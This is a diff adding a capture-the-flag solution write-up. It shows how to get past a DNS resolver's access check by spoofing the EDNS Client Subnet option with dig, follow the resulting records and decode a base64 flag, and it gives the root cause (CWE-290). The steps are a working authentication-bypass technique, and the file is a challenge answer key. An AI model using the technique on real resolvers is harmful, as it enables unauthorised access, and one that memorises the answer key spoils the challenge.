@@ -1,0 +1,50 @@
+# Solution — dns-ecs-bypass
+
+## Step 1 — recon
+
+```bash
+nmap -sU -p 5353 TARGET_IP
+```
+
+Confirms `5353/udp` is open.
+
+## Step 2 — baseline query
+
+```bash
+dig @TARGET_IP -p 5353 flag.ctf.local
+```
+
+Response: `REFUSED`. The resolver is enforcing some access restriction on
+this name.
+
+## Step 3 — bypass with EDNS Client Subnet
+
+```bash
+dig @TARGET_IP -p 5353 flag.ctf.local +subnet=10.10.10.0/24
+```
+
+Response: a `CNAME` pointing at an internal-looking name. Declaring the
+trusted subnet via ECS was enough to pass the check — the resolver never
+verified the real source address.
+
+## Step 4 — follow the chain
+
+```bash
+dig @TARGET_IP -p 5353 <cname-target> +subnet=10.10.10.0/24
+```
+
+Response: a `TXT` record containing a base64 string.
+
+## Step 5 — decode
+
+```bash
+echo '<base64-value>' | base64 -d
+```
+
+Result: the flag, in `duck{...}` format.
+
+## Root cause
+
+The resolver trusts the EDNS Client Subnet option as if it were a verified
+network attribute, when it is in fact just another field the client writes
+into its own query (CWE-290).
